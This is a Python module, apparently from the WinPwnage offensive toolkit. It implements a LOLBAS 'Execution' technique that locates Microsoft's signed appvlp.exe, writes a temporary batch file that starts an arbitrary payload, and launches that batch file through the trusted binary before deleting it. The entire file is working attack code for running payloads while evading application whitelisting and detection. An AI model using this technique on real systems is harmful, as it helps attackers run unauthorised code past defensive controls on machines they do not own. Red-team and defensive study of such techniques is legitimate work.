import os
import random
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/

appvlp_info = {
	"Description": "Execute payload using appvlp binary",
	"Id": "15",
	"Type": "Execution",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "exec_appvlp",
	"Function Payload": True,
}


def exec_appvlp(payload):
	if payloads().exe(payload):
		paths = []
		binary = "appvlp.exe"

		print_info("Searching for ({binary}) in system32 and syswow64".format(binary=binary))
		for root, dirs, files in os.walk(os.environ["ProgramFiles(x86)"]):
			for name in files:
				if name.lower() == binary:
					if "system32" in root.lower() or "syswow64" in root.lower():
						paths.append(os.path.join(root, name))

		try:
			path = random.choice(paths)
		except IndexError:
			print_error("Unable to proceed, ({binary}) not found on system".format(binary=binary))
			return False
		else:
			print_info("Located ({binary}) binary".format(binary=binary))
			with open(os.path.join(tempfile.gettempdir(),"appvlp.bat"), "w") as f:
				f.write("start {payload}".format(payload=payload))

			print_info("Attempting to launch {payload} using ({binary}) binary".format(payload=payload,binary=binary))
			exit_code = process().create(path,
						params="{tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(),"appvlp.bat")),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created process ({}) exit code ({})".format(payload, exit_code))
			else:
				print_error("Unable to create process ({}) exit code ({})".format(payload, exit_code))
				return False

			try:
				os.remove(os.path.join(tempfile.gettempdir(),"appvlp.bat"))
			except Exception:
				pass
	else:
		print_error("Cannot proceed, invalid payload")
		return False				